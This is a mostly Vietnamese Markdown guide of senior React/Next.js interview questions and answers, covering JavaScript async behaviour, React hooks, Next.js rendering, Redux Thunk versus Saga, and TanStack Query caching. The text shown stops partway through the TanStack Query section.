# Senior React/Next.js Interview Practice - 50 Questions

## Overview

**Position:** Senior React/Next.js Developer
**Topics:** HTML, CSS, JavaScript, TypeScript, React, Next.js, State Management, Testing, Security, Performance, Git, Architecture

---

## Questions & Answers

### JavaScript Fundamentals

---

#### Q1: Promise.all(), Promise.allSettled(), Promise.race(), Promise.any()

**Answer:**

Cả 4 methods đều handle nhiều promises song song:

- **`Promise.all()`**: Resolve khi tất cả promises fulfill, **reject ngay lập tức** khi có 1 promise reject (fail-fast behavior)
- **`Promise.allSettled()`**: Luôn resolve, trả về array kết quả của tất cả promises (cả fulfilled và rejected)
- **`Promise.race()`**: Trả về promise đầu tiên **settle** (dù fulfilled hay rejected). Hay dùng cho timeout pattern
- **`Promise.any()`**: Trả về promise đầu tiên **fulfilled**, bỏ qua rejected. Chỉ reject khi tất cả đều reject

```js
// Race cho timeout
Promise.race([
  fetchData(),
  new Promise((_, reject) => setTimeout(() => reject("Timeout"), 5000)),
]);
```

---

#### Q2: Event Loop - Output của console.log

```js
console.log("1");
setTimeout(() => console.log("2"), 0);
Promise.resolve().then(() => console.log("3"));
console.log("4");
```

**Answer:** Output là `1, 4, 3, 2`

**Giải thích - Event Loop có 3 phần:**

1. **Call Stack** - chạy code đồng bộ trực tiếp (không qua queue)
2. **Microtask Queue** - Promise callbacks, queueMicrotask
3. **Macrotask Queue** - setTimeout, setInterval, I/O

**Thứ tự ưu tiên:** Sync (Call Stack) → Microtasks → Macrotasks

- `console.log('1')` → sync, chạy trực tiếp trên Call Stack → **1**
- `setTimeout` → đăng ký callback vào macrotask queue
- `Promise.then` → đăng ký callback vào microtask queue
- `console.log('4')` → sync, chạy trực tiếp trên Call Stack → **4**
- Call Stack trống → Event Loop check microtask queue → **3**
- Microtask queue trống → Event Loop check macrotask queue → **2**

> **Tip:** "Microtasks always run before macrotasks"
>
> **Lưu ý:** Sync code (`console.log`) chạy trực tiếp trên Call Stack, không đưa vào queue nào cả. Chỉ có callbacks của async operations mới vào queue.

---

#### Q3: useEffect, useLayoutEffect, useMemo

**Answer:**

- **`useMemo`**: Caching giá trị tính toán phức tạp, chỉ tính lại khi dependencies thay đổi

- **`useEffect`**: Chạy side effects **sau khi browser paint** (bất đồng bộ). Dùng cho: API calls, subscriptions, DOM mutations không cần đồng bộ

- **`useLayoutEffect`**: Chạy **đồng bộ sau DOM mutations, TRƯỚC browser paint**. Dùng khi:
  - Cần đo kích thước DOM (width, height, position)
  - Cần thay đổi DOM ngay để tránh **flickering**

```jsx
// useLayoutEffect cho tooltip positioning
useLayoutEffect(() => {
  const { width } = ref.current.getBoundingClientRect();
  setPosition(calculatePosition(width));
}, []);
```

---

#### Q4: Optimize component render 1000 items

**Answer:**

**🥇 #1 Priority: Virtualization** (quan trọng nhất cho large list "lag khi scroll"):

- Chỉ render items **trong viewport** (ví dụ: 10-15 items)
- Khi scroll → unmount items cũ, mount items mới
- DOM luôn nhẹ dù có 1000 hay 100,000 items
- Dùng `react-window` hoặc `react-virtuoso`

```jsx
import { FixedSizeList } from "react-window";

<FixedSizeList height={500} itemCount={1000} itemSize={35}>
  {({ index, style }) => <div style={style}>{items[index]}</div>}
</FixedSizeList>;
```

**Các techniques khác:**

2. **`React.memo`** - wrap child components để tránh re-render khi props không đổi

3. **`useMemo` / `useCallback`** - cache values và function references

4. **Correct key props** - dùng unique id, không dùng index

5. **Intersection Observer / Lazy loading** - load items khi scroll vào viewport

6. **Pagination** - chia nhỏ data (nếu UX cho phép)

**So sánh Virtualization vs Lazy Loading:**

| Technique | DOM nodes | Memory |
|-----------|-----------|--------|
| Lazy Loading | Tăng dần khi scroll | Tăng dần |
| Virtualization | Cố định (chỉ viewport) | Cố định |

> **Tip:** Nếu requirement là hiển thị **full list không pagination** → **Virtualization** là answer đúng nhất.

---

#### Q5: interface vs type trong TypeScript

**Answer:**

Cả 2 đều dùng để define types, nhưng có sự khác biệt:

**Interface:**

- ✅ Declaration merging (merge khi declare cùng tên)
- ✅ `extends` để kế thừa
- ✅ Tốt cho object shapes, class contracts

```ts
interface User {
  name: string;
}
interface User {
  age: number;
} // Merge → { name, age }
```

**Type:**

- ✅ Union types: `type Status = 'loading' | 'success' | 'error'`
- ✅ Intersection: `type Admin = User & { role: string }`
- ✅ Primitives, tuples: `type ID = string | number`
- ✅ Mapped types, conditional types
- ❌ Không merge được

**Guideline:** Interface cho objects, Type cho unions/complex types

---

#### Q6: getStaticProps, getServerSideProps, getStaticPaths

**Answer:**

**SSG (Static Site Generation):**

- **`getStaticPaths`**: Generate danh sách dynamic routes tại build time, trả về `paths` và `fallback`
- **`getStaticProps`**: Fetch data cho mỗi page tại build time

```js
// pages/posts/[id].js
export async function getStaticPaths() {
  return {
    paths: [{ params: { id: "1" } }, { params: { id: "2" } }],
    fallback: false, // 'blocking' | true
  };
}

export async function getStaticProps({ params }) {
  const post = await fetchPost(params.id);
  return { props: { post } };
}
```

**SSR (Server-Side Rendering):**

- **`getServerSideProps`**: Fetch data **mỗi request**, chậm hơn nhưng data luôn fresh

**Khi nào dùng:**
| Use case | Method |
|----------|--------|
| Blog, docs, marketing pages | SSG |
| Data thay đổi thường xuyên, user-specific | SSR |

---

#### Q7: Server Components vs Client Components

**Answer:**

**Server Components (default trong App Router):**

- ❌ Không dùng được hooks (useState, useEffect, etc.)
- ❌ Không dùng được browser APIs
- ✅ Async/await trực tiếp trong component
- ✅ Bundle size nhỏ hơn (không gửi JS xuống client)

```jsx
// Server Component by default
async function PostsPage() {
  const posts = await fetchPosts(); // fetch trực tiếp
  return <div>{posts.map(...)}</div>;
}
```

**Client Components:**

- Thêm `"use client"` ở đầu file
- ✅ Dùng được hooks, browser APIs, event handlers
- ✅ Vẫn được **pre-render HTML ở server** → sau đó hydrate ở client

> **Tip:** Server Components cho data fetching, Client Components cho interactivity

---

#### Q8: State Management - Context vs Redux vs Zustand

**Answer:**

**Context API:**

- ✅ Tốt cho: theme, auth, locale (data ít thay đổi)
- ❌ Không tốt cho frequent updates (re-render toàn bộ consumers)
- ❌ Nested providers có thể gây phức tạp

**Zustand:**

- ✅ Nhỏ gọn (~1kb), ít boilerplate
- ✅ Không cần Provider wrapper
- ✅ Có selector, chỉ subscribe field cần thiết
- ✅ Middleware support (persist, devtools, immer)
- ✅ Tốt cho small-medium apps

**Redux (RTK):**

- ✅ DevTools mạnh, time-travel debugging
- ✅ Middleware ecosystem (thunk, saga, RTK Query)
- ✅ Predictable, tốt cho large teams và complex state
- ❌ Boilerplate nhiều hơn

**Guideline - Khi nào dùng gì:**

| Use case | Recommendation |
|----------|----------------|
| Theme, auth, locale (ít thay đổi) | Context API |
| Small-medium app, ít boilerplate | Zustand |
| Large app, complex state, enterprise | Redux (RTK) |
| Cần middleware ecosystem (saga, thunk) | Redux |
| Cần DevTools + time-travel debugging | Redux hoặc Zustand |

> **Tip:** Context re-render toàn bộ consumers khi value thay đổi. Redux/Zustand chỉ re-render components subscribe field cụ thể.

---

#### Q8.1: Redux History - Flux và Elm Architecture

**Answer:**

**Timeline:**

```
2013 - React ra đời (Context API cũ, experimental)
2014 - Facebook giới thiệu Flux pattern
2015 - Redux ra đời (Dan Abramov) - Flux + Elm
2018 - React 16.3: Context API mới (stable)
2019 - React Hooks
```

**Flux Pattern (Facebook, 2014):**

Giải quyết vấn đề MVC truyền thống với two-way data binding gây khó debug. Flux đưa ra **one-way data flow**:

```
Action → Dispatcher → Store(s) → View
   ↑                              │
   └──────────────────────────────┘
```

**Elm Architecture:**

Functional programming language với kiến trúc đơn giản:

```
Model (State) → View → Msg (Action) → Update (Reducer) → New Model
```

**Redux = Flux + Elm:**

| Từ Flux | Từ Elm |
|---------|--------|
| Unidirectional flow | Single state tree |
| Actions | Pure reducer functions |
| Dispatcher concept | Immutability |

Redux cải tiến: Single Store (thay vì nhiều stores), Middleware, DevTools với time-travel.

---

#### Q8.2: Redux Flow - Không có vs Có Middleware

**Answer:**

**Redux KHÔNG CÓ Middleware:**

```
View → dispatch(action) → Reducer → Store → View re-render
```

Khi dispatch, Action (object với `type` và `payload`) đi **thẳng vào Reducer**. Reducer là pure function, nhận state cũ + action, trả về state mới. Store lưu và thông báo View re-render.

**Vấn đề:** Reducer bắt buộc là pure function - không được gọi API, không async, không side effects. Vậy fetch data ở đâu? **Không có chỗ!**

**Redux CÓ Middleware:**

```
View → dispatch(action) → Middleware(s) → Reducer → Store → View
```

**Middleware là lớp trung gian** giữa Action và Reducer. Middleware có thể:
- Chặn/modify action trước khi đến reducer
- Dispatch thêm actions khác
- Thực hiện side effects (API calls, logging)
- Handle async operations

---

#### Q8.2.1: Tại sao phải dùng Middleware (Thunk/Saga)?

**Answer:**

**Lý do 1: Reducer BẮT BUỘC phải Pure - Tại sao?**

```js
// ❌ Reducer KHÔNG ĐƯỢC làm:
function reducer(state, action) {
  await fetch('/api')             // ❌ Async
  console.log('...')              // ❌ Side effect
  return { value: Math.random() } // ❌ Không predictable
}
```

Redux yêu cầu reducer pure vì:

- **Time-travel debugging:** DevTools replay actions → nếu có `Math.random()` hoặc `Date.now()` → replay ra kết quả khác → debug vô nghĩa
- **Predictable:** Team 5 devs đều biết `dispatch({ type: 'INCREMENT' })` → `count + 1`, không side effect bất ngờ
- **Hot reloading:** Dev thay đổi reducer code → Redux reload và replay actions → state giữ nguyên

→ Vậy side effects (gọi API) làm ở đâu? **Middleware** - lớp trung gian xử lý trước khi action đến reducer.

---

**Lý do 2: Không middleware → Code component phình to, lặp lại**

Ví dụ: User click "Add to Cart" cần: loading → call API → success/error → update UI

```js
// ❌ Không middleware - Logic trong Component
function ProductCard({ product }) {
  const dispatch = useDispatch()
  const [loading, setLoading] = useState(false)

  const handleAddToCart = async () => {
    setLoading(true)
    dispatch({ type: 'CART_LOADING' })
    try {
      await api.addToCart(product.id)
      dispatch({ type: 'CART_ADD_SUCCESS', payload: product })
      toast.success('Added!')
    } catch (error) {
      dispatch({ type: 'CART_ADD_ERROR', payload: error })
      toast.error('Failed!')
    } finally {
      setLoading(false)
    }
  }

  return <button onClick={handleAddToCart}>Add</button>
}
// Vấn đề: Component khác cũng có "Add to Cart" → copy paste toàn bộ logic
// PM yêu cầu thêm analytics → sửa TẤT CẢ components
```

```js
// ✅ Có Thunk - Logic tách riêng
// cartActions.js
export const addToCart = (product) => async (dispatch) => {
  dispatch({ type: 'CART_LOADING' })
  try {
    await api.addToCart(product.id)
    dispatch({ type: 'CART_ADD_SUCCESS', payload: product })
    toast.success('Added!')
    analytics.track('add_to_cart', product)  // Thêm 1 chỗ, áp dụng mọi nơi
  } catch (error) {
    dispatch({ type: 'CART_ADD_ERROR', payload: error })
    toast.error('Failed!')
  }
}

// Component - Clean, 1 dòng
function ProductCard({ product }) {
  const dispatch = useDispatch()
  return <button onClick={() => dispatch(addToCart(product))}>Add</button>
}
```

---

**Lý do 3: Share data giữa components không liên quan**

```
     Header (CartIcon cần cart count)
        ↑
        │ Không liên quan trực tiếp
        │
  ProductPage → ProductCard → [Add to Cart] dispatch
```

- **Không Redux:** Lift state lên App → prop drilling 3-4 cấp
- **Có Redux:** `dispatch(addToCart)` → Store update → `CartIcon` tự động re-render

---

**So sánh 2 approaches:**

**Cách 1: Services + Local State (Không cần Redux)**
```
Component A cần user → services/getUser() → setState
Component B cần user → services/getUser() → setState  // Fetch lại
Component C cần user → services/getUser() → setState  // Fetch lại
```
Mỗi component tự fetch, data không share. **Phù hợp khi data chỉ dùng 1-2 chỗ.**

**Cách 2: Redux + Middleware**
```
Component A dispatch(fetchUser()) → Middleware gọi API → Lưu Store
Component B useSelector(user) ←── Lấy từ Store (không fetch lại)
Component C useSelector(user) ←── Lấy từ Store (không fetch lại)
```
Fetch 1 lần, nhiều nơi dùng chung. **Phù hợp khi data dùng nhiều chỗ.**

---

**Tóm lại - Lý do cần Middleware:**

| Vấn đề | Không Middleware | Có Middleware |
|--------|------------------|---------------|
| Reducer pure, không có chỗ async | Logic trong component | Middleware xử lý |
| Code lặp lại mỗi component | Copy paste | Viết 1 lần, dùng mọi nơi |
| Testing | Mock component + API | Test action riêng |
| Maintain (thêm analytics) | Sửa N components | Sửa 1 file |
| Share data | Prop drilling | Store tự sync |
| UI + Logic | Lẫn lộn | Tách biệt |

---

**Khi nào dùng gì?**

| Tình huống | Approach |
|------------|----------|
| Data dùng trong 1-2 components | Services + Local State |
| Data share giữa nhiều components xa nhau | Redux + Middleware |
| Simple CRUD, mỗi page độc lập | Services + Local State |
| Complex workflow nhiều steps | Redux + Saga |

---

#### Q8.3: Redux-Thunk hoạt động như thế nào?

**Answer:**

**Ý tưởng:** Thay vì chỉ dispatch object, cho phép dispatch **function**.

```js
// Thunk middleware (~10 dòng code)
const thunk = (store) => (next) => (action) => {
  if (typeof action === 'function') {
    return action(store.dispatch, store.getState)
  }
  return next(action)
}
```

**Ví dụ sử dụng:**

```js
// Thunk action creator
const fetchUser = (userId) => async (dispatch) => {
  dispatch({ type: 'FETCH_START' })

  try {
    const user = await api.getUser(userId)
    dispatch({ type: 'FETCH_SUCCESS', payload: user })
  } catch (error) {
    dispatch({ type: 'FETCH_ERROR', payload: error })
  }
}

// Dispatch function thay vì object
dispatch(fetchUser(123))
```

**Hạn chế của Thunk:**
- ❌ Cancel request cũ → phải tự implement
- ❌ Race condition → khó handle
- ❌ Debounce/Throttle → phải tự implement
- ❌ Complex flows → callback hell

---

#### Q8.4: Redux-Saga vs Redux-Thunk - Khi nào dùng gì?

**Answer:**

**Thunk đủ dùng khi:** Simple async - fetch API, CRUD cơ bản.

**Saga cần thiết khi:** Complex flows - cancel, debounce, retry, chờ action khác.

---

**Case 1: Cancel request cũ (Search autocomplete)**

User gõ nhanh: "r" → "re" → "rea" → "react". Chỉ muốn kết quả của "react".

```js
// ❌ Thunk - Phải tự implement, dễ bug
let currentRequestId = 0
const search = (query) => async (dispatch) => {
  const requestId = ++currentRequestId
  const results = await api.search(query)

  if (requestId === currentRequestId) {  // Check request mới nhất
    dispatch({ type: 'SEARCH_SUCCESS', payload: results })
  }
  // BUG: Nếu "re" response về SAU "react" → ghi đè kết quả sai
}

// ✅ Saga - 1 từ khóa, tự động cancel request cũ
function* rootSaga() {
  yield takeLatest('SEARCH', searchSaga)
}
```

---

**Case 2: Debounce (Search input)**

User gõ search, chỉ gọi API sau khi ngừng gõ 500ms.

```js
// ❌ Thunk - Tự manage timeout
let timeoutId = null
const search = (query) => (dispatch) => {
  clearTimeout(timeoutId)
  timeoutId = setTimeout(async () => {
    const results = await api.search(query)
    dispatch({ type: 'SUCCESS', payload: results })
  }, 500)
}

// ✅ Saga - Built-in
yield debounce(500, 'SEARCH', searchSaga)
```

---

**Case 3: Complex Checkout Workflow**

Flow: validate cart → apply coupon → calculate shipping → create order → clear cart → redirect

```js
// ❌ Thunk - Nested, khó đọc, khó maintain
const checkout = () => async (dispatch, getState) => {
  try {
    dispatch({ type: 'CHECKOUT_START' })
    await api.validateCart(getState().cart)

    const coupon = await api.applyCoupon(getState().couponCode)
    if (!coupon.valid) throw new Error('Invalid coupon')

    const shipping = await api.calculateShipping(getState().address)
    const order = await api.createOrder({
      cart: getState().cart,
      coupon,
      shipping
    })

    dispatch({ type: 'CLEAR_CART' })
    dispatch({ type: 'REDIRECT', payload: `/thank-you/${order.id}` })
  } catch (error) {
    dispatch({ type: 'CHECKOUT_ERROR', payload: error })
    // Rollback logic ở đâu? Rất phức tạp
  }
}

// ✅ Saga - Đọc như sync code, clear flow
function* checkoutSaga() {
  try {
    yield put({ type: 'CHECKOUT_START' })

    yield call(api.validateCart)
    const coupon = yield call(api.applyCoupon)
    const shipping = yield call(api.calculateShipping)
    const order = yield call(api.createOrder, { coupon, shipping })

    yield put({ type: 'CLEAR_CART' })
    yield put({ type: 'REDIRECT', payload: `/thank-you/${order.id}` })
  } catch (error) {
    yield put({ type: 'CHECKOUT_ERROR', payload: error })
  }
}
```

---

**Case 4: Chờ action khác (Login → Fetch Profile → Redirect)**

```js
// ❌ Thunk - KHÔNG THỂ "chờ" action khác dispatch
// Phải dùng callback chain hoặc Promise rất phức tạp

// ✅ Saga - yield take() chờ action
function* loginFlowSaga() {
  while (true) {
    // Chờ user click login
    const { payload } = yield take('LOGIN_REQUEST')

    // Call API login
    const user = yield call(api.login, payload)
    yield put({ type: 'LOGIN_SUCCESS', payload: user })

    // Chờ profile load xong (action từ component khác)
    yield take('PROFILE_LOADED')

    // Rồi mới redirect
    yield put({ type: 'REDIRECT', payload: '/dashboard' })
  }
}
```

---

**Case 5: Race - Timeout hoặc Cancel**

Fetch data với timeout 5s, hoặc user có thể cancel:

```js
// ✅ Saga - race giữa nhiều tasks
function* fetchWithTimeout() {
  const { data, timeout, cancelled } = yield race({
    data: call(api.fetchData),
    timeout: delay(5000),
    cancelled: take('CANCEL_FETCH')
  })

  if (data) yield put({ type: 'SUCCESS', payload: data })
  if (timeout) yield put({ type: 'TIMEOUT_ERROR' })
  if (cancelled) yield put({ type: 'CANCELLED' })
}
```

---

**Tóm lại:**

| Tình huống | Thunk | Saga |
|------------|-------|------|
| Simple CRUD | ✅ Đủ dùng | Overkill |
| Cancel request cũ | Tự implement, dễ bug | `takeLatest` |
| Debounce/Throttle | Tự implement | Built-in |
| Complex workflow | Callback hell | Clean, readable |
| Chờ action khác | ❌ Không thể | `take()` |
| Retry on fail | Tự implement | `retry(3, 1000, fn)` |
| Race/Timeout | Phức tạp | `race()` |
| Learning curve | Thấp | Cao (Generator) |

---

**Tại sao production apps thường chọn Saga?**

1. **Complex flows phổ biến** - checkout, onboarding, wizards
2. **Cancel/retry là requirement thực tế** - UX tốt hơn
3. **Testability** - Saga test dễ hơn (yield effects, không gọi API thật)
4. **Debugging** - Flow rõ ràng, dễ trace
5. **Team scale** - Code consistent, dễ onboard dev mới

---

#### Q8.4.1: Chi tiết từng Case - Vấn đề, Nguyên nhân, Solution

---

**Case 1: Cancel Request Cũ (Search Autocomplete)**

**Scenario:** E-commerce search bar (Shopee, Tiki, Amazon)

**Vấn đề:** User gõ "iphone", kết quả nhảy lung tung: "iphone" → "ip" → "i"

**Nguyên nhân:** Network latency không đều, response cũ về SAU response mới → ghi đè kết quả.

```
Request "i"      gửi 0ms    → response 800ms (chậm)
Request "iphone" gửi 500ms  → response 700ms
→ "iphone" hiển thị trước, rồi "i" ghi đè → BUG
```

**Thunk:** Tự implement request ID tracking, vẫn tốn bandwidth vì API vẫn gọi.

```js
let currentRequestId = 0
const search = (query) => async (dispatch) => {
  const requestId = ++currentRequestId
  const results = await api.search(query)
  if (requestId === currentRequestId) {  // Chỉ dispatch nếu mới nhất
    dispatch({ type: 'SUCCESS', payload: results })
  }
}
```

**Saga:** `takeLatest` tự động cancel saga cũ khi action mới vào.

```js
yield takeLatest('SEARCH', searchSaga)
// Action mới → saga cũ bị CANCEL → chỉ response cuối được dispatch
```

---

**Case 2: Debounce (Search Input)**

**Scenario:** Filter sản phẩm, auto-save draft

**Vấn đề:** User gõ "iphone" (6 ký tự) → 6 API calls trong 500ms → server overload.

**Nguyên nhân:** Mỗi keystroke trigger 1 API call.

**Khác với takeLatest:**
- `takeLatest`: Gọi API ngay, cancel cái cũ (6 calls, cancel 5)
- `debounce`: Chờ im lặng 500ms rồi mới gọi (1 call duy nhất)

**Saga:**

```js
yield debounce(500, 'SEARCH', searchSaga)
// Chờ 500ms không có action mới → mới chạy saga
```

---

**Case 3: Complex Checkout Workflow**

**Scenario:** Checkout flow của e-commerce (7+ steps)

**Vấn đề:** Step 5 fail → cần rollback step 1-4. Code Thunk 100+ dòng, khó maintain.

**Nguyên nhân:** Workflow tuần tự với dependency, mỗi step fail cần rollback khác nhau.

**Thunk:** 1 function khổng lồ, flags để track state, rollback logic phức tạp.

**Saga:** Mỗi step là saga riêng, compose lại trong main saga.

```js
function* checkoutSaga() {
  const completedSteps = []
  try {
    yield call(validateCartSaga)

    yield call(lockInventorySaga)
    completedSteps.push('inventory')

    const coupon = yield call(applyCouponSaga)
    completedSteps.push('coupon')

    const order = yield call(createOrderSaga)
    completedSteps.push('order')

    yield call(processPaymentSaga, order.id)
    yield put({ type: 'CHECKOUT_SUCCESS' })
  } catch (error) {
    yield call(rollbackSaga, completedSteps)  // Rollback đúng steps
    yield put({ type: 'CHECKOUT_ERROR' })
  }
}
```

**Lợi ích:** Mỗi step test riêng, main saga đọc như flowchart, rollback tách biệt.

---

**Case 4: Chờ Action Khác (Login Flow)**

**Scenario:** Login → fetch profile VÀ permissions → CHỜ cả 2 xong → redirect

**Vấn đề:** Profile và Permissions fetch bởi components KHÁC. Ai biết khi nào cả 2 xong?

**Nguyên nhân:** Parallel async với dependency, Thunk không thể "chờ" action từ nơi khác.

**Thunk:** Phải fetch trong cùng 1 thunk (không tận dụng component separation).

**Saga:** `yield take()` pause saga, chờ action được dispatch bởi BẤT KỲ AI.

```js
function* loginFlowSaga() {
  const { payload } = yield take('LOGIN_REQUEST')
  const { token } = yield call(api.login, payload)
  yield put({ type: 'LOGIN_SUCCESS', payload: token })

  // Trigger fetches (components khác có thể handle)
  yield put({ type: 'FETCH_PROFILE_REQUEST' })
  yield put({ type: 'FETCH_PERMISSIONS_REQUEST' })

  // CHỜ cả 2 SUCCESS
  yield all([
    take('FETCH_PROFILE_SUCCESS'),
    take('FETCH_PERMISSIONS_SUCCESS')
  ])

  // Cả 2 xong → redirect
  yield put({ type: 'REDIRECT', payload: '/dashboard' })
}
```

---

**Case 5: Race - Timeout/Cancel**

**Scenario:** Upload file lớn với nút Cancel và timeout 60s

**Vấn đề:** 3 outcomes có thể: success / cancelled / timeout. Cần biết cái nào xảy ra.

**Nguyên nhân:** 3 async operations chạy parallel, cái nào TRƯỚC thì "thắng".

**Thunk:** Global AbortController, Promise.race, cleanup phức tạp.

**Saga:** `yield race()` chạy parallel, cái xong trước return, TỰ ĐỘNG cancel còn lại.

```js
function* uploadFileSaga(action) {
  const { success, cancelled, timeout } = yield race({
    success: call(api.uploadFile, action.payload.file),
    cancelled: take('UPLOAD_CANCEL'),  // Chờ user click Cancel
    timeout: delay(60000)               // 60s timeout
  })

  if (success) yield put({ type: 'UPLOAD_SUCCESS', payload: success })
  if (cancelled) {
    yield put({ type: 'UPLOAD_CANCELLED' })
    yield call(api.cleanupPartialUpload)
  }
  if (timeout) yield put({ type: 'UPLOAD_TIMEOUT' })
}
```

---

**Tổng kết Saga Effects:**

| Case | Vấn đề | Effect | Hoạt động |
|------|--------|--------|-----------|
| Search autocomplete | Response cũ ghi đè | `takeLatest` | Cancel saga cũ khi action mới |
| Debounce input | Quá nhiều API calls | `debounce` | Chờ im lặng rồi mới chạy |
| Complex workflow | Code khổng lồ | `call` + compose | Tách saga nhỏ, dễ test |
| Chờ actions | Không biết khi nào xong | `take` + `all` | Pause chờ action |
| Timeout/Cancel | 3 outcomes race | `race` | Parallel, first wins |

---

#### Q8.5: Tóm tắt Flow - Không Middleware vs Thunk vs Saga

**Answer:**

**Không Middleware:**
```
Component → dispatch(object) → Reducer → Store
```
Component dispatch object `{ type, payload }` → Reducer lắng nghe type → Update state.

---

**Có Thunk:**
```
Component → dispatch(function) → Thunk chạy function → dispatch(object) → Reducer
```
Component dispatch **async function** → Function call API → Dispatch object xuống Reducer.

```js
// Component
dispatch(fetchUser(123))  // dispatch function

// Thunk
const fetchUser = (userId) => async (dispatch) => {
  const user = await api.getUser(userId)
  dispatch({ type: 'SET_USER', payload: user })  // dispatch xuống reducer
}
```

---

**Có Saga:**
```
Component → dispatch(object) → Saga lắng nghe → Saga function chạy → yield put(object) → Reducer
```
Component dispatch **object bình thường** → Saga lắng nghe type → Saga xử lý async → `yield put` dispatch xuống Reducer.

```js
// Component
dispatch({ type: 'FETCH_USER', payload: { userId: 123 } })  // dispatch object

// Saga lắng nghe
yield takeLatest('FETCH_USER', fetchUserSaga)

// Saga function
function* fetchUserSaga(action) {
  const user = yield call(api.getUser, action.payload.userId)
  yield put({ type: 'SET_USER', payload: user })  // dispatch xuống reducer
}
```

---

**So sánh:**

| | Không Middleware | Thunk | Saga |
|---|---|---|---|
| Component dispatch | Object | **Function** | Object |
| Ai xử lý async? | ❌ Không có | Function được dispatch | Saga lắng nghe riêng |
| Dispatch xuống reducer | Trực tiếp | `dispatch()` | `yield put()` |
| Tách biệt side effects | ❌ | Trong function | ✅ Hoàn toàn tách biệt |

---

#### Q8.6: Client State vs Server State - Tại sao phải chia?

**Answer:**

**Lưu ý:** Câu hỏi này thường đề cập đến **Vanilla Redux**, không phải Redux Toolkit (RTK Query).

---

**Server State vs Client State khác nhau như nào?**

| Đặc điểm | Server State | Client State |
|----------|--------------|--------------|
| Nguồn gốc | Database, API | User interaction |
| Ownership | Backend owns | Frontend owns |
| Shared | Nhiều users cùng thấy | Chỉ user hiện tại |
| Stale | Có thể outdated | Luôn current |
| Sync | Cần sync với server | Không cần |

**Ví dụ:**
- Server State: User profile, Products, Orders, Comments
- Client State: Theme, Sidebar open/close, Modal visible, Form inputs

---

**Vanilla Redux quản lý Server State - Vấn đề gì?**

**1. Boilerplate nhiều:**

```js
// Chỉ để fetch users cần: 3 action types + 1 thunk + 1 reducer
// 50+ dòng code cho 1 API call
// 20 APIs = 1000+ dòng boilerplate
```

**2. Caching phải tự implement:**

```js
// Phải tự check trước khi fetch
useEffect(() => {
  if (users.length === 0) {  // Tự check
    dispatch(fetchUsers())
  }
}, [])
// Không có staleTime concept (data bao lâu thì cần refetch?)
```

**3. Background refetch phải tự implement:**

```js
// Tự implement refetch mỗi 5 phút
useEffect(() => {
  const interval = setInterval(() => dispatch(fetchUsers()), 5 * 60 * 1000)
  return () => clearInterval(interval)
}, [])

// Tự implement refetch on window focus
useEffect(() => {
  const handleFocus = () => dispatch(fetchUsers())
  window.addEventListener('focus', handleFocus)
  return () => window.removeEventListener('focus', handleFocus)
}, [])
```

**4. Deduplication phải tự implement:**

```js
// 3 components cùng mount, cùng cần users
// → 3 API calls nếu không có check logic
```

---

**TanStack Query / RTK Query giải quyết:**

```js
// TanStack Query - 5 dòng, tất cả built-in
const { data, isLoading } = useQuery({
  queryKey: ['users'],
  queryFn: () => api.getUsers(),
  staleTime: 5 * 60 * 1000,      // Fresh trong 5 phút
  refetchOnWindowFocus: true,    // Refetch khi focus
})

// RTK Query - tương tự, trong Redux ecosystem
const { data, isLoading } = useGetUsersQuery()
```

---

**So sánh Vanilla Redux vs RTK Query vs TanStack Query:**

| Feature | Vanilla Redux | RTK Query | TanStack Query |
|---------|---------------|-----------|----------------|
| Caching | Tự implement | ✅ Built-in | ✅ Built-in |
| Stale time | Tự implement | ✅ Built-in | ✅ Built-in |
| Background refetch | Tự implement | ✅ Built-in | ✅ Built-in |
| Refetch on focus | Tự implement | ✅ Built-in | ✅ Built-in |
| Deduplication | Tự implement | ✅ Built-in | ✅ Built-in |
| Retry on fail | Tự implement | ✅ Built-in | ✅ Built-in |
| Redux ecosystem | ✅ | ✅ | ❌ Riêng biệt |
| Bundle size | Redux only | Redux + RTK | ~12kb |

---

**Modern Architecture:**

```
┌─────────────────────────────────────────────┐
│              APP STATE                       │
├─────────────────────────────────────────────┤
│   SERVER STATE          CLIENT STATE         │
│   ┌───────────┐        ┌───────────┐        │
│   │ TanStack  │        │  Zustand  │        │
│   │  Query    │   OR   │  Context  │        │
│   │ RTK Query │        │  Redux    │        │
│   └───────────┘        └───────────┘        │
└─────────────────────────────────────────────┘
```

---

**Khi nào dùng gì?**

| Tình huống | Recommendation |
|------------|----------------|
| Đã có Redux, muốn cải thiện server state | RTK Query |
| App mới, không cần Redux | TanStack Query + Zustand/Context |
| Enterprise, cần Redux DevTools | Redux + RTK Query |

---

**Tóm lại:**

- **Vanilla Redux** CÓ THỂ handle server state, nhưng **tự implement** mọi thứ
- **RTK Query** (Redux Toolkit) đã có built-in, **trong Redux ecosystem**
- **TanStack Query** built-in, **riêng biệt** khỏi Redux
- Chia client/server state không phải vì Redux "không làm được", mà vì **đúng tool cho đúng việc**

---

#### Q8.7: TanStack Query Deep Dive - Các câu hỏi phỏng vấn Senior

---

**Q: Giải thích cách Caching của TanStack Query hoạt động?**

TanStack Query cache dựa trên **Query Key**. Mỗi key là unique identifier cho cache entry.

**2 config quan trọng:**

| Config | Mặc định | Ý nghĩa |
|--------|----------|---------|
| `staleTime` | 0 | Bao lâu data được coi là "fresh" |
| `gcTime` | 5 phút | Bao lâu cache tồn tại sau khi không có observer |

**Flow:**

```
0:00 - Component A mount → Cache MISS → Fetch → Cache (fresh)
0:30 - Component B mount → Cache HIT → Return ngay → Background refetch (nếu stale)
2:00 - Cả 2 unmount → Bắt đầu đếm gcTime
7:00 - gcTime hết → Cache bị garbage collected
```

**Config theo use case:**

```js
// Data ít thay đổi (profile, settings)
staleTime: 10 * 60 * 1000  // 10 phút

// Data thay đổi thường xuyên (notifications)
staleTime: 0, refetchInterval: 30 * 1000  // Poll mỗi 30s

// Data static (countries, categories)
staleTime: Infinity  // Không bao giờ stale
```

---

**Q: Query Key dùng để làm gì? Best practices?**

**3 chức năng:**
1. Unique identifier cho cache
2. Dependency tracking - key thay đổi → auto refetch
3. Invalidation matching

**Best practices:**

```js
// ❌ BAD: Key không phản ánh dependencies
queryKey: ['users']
queryFn: () => api.getUsers(filters, page)  // filters thay đổi nhưng không refetch

// ✅ GOOD: Key chứa tất cả dependencies
queryKey: ['users', { filters, page, sortBy }]
queryFn: () => api.getUsers(filters, page, sortBy)
```

**Invalidation matching:**

```js
// Cache: ['user', 1], ['user', 2], ['user', 1, 'posts']

queryClient.invalidateQueries({ queryKey: ['user'] })
// → Invalidate TẤT CẢ bắt đầu bằng 'user'

queryClient.invalidateQueries({ queryKey: ['user', 1], exact: true })
// → Chỉ invalidate ['user', 1]
```

---

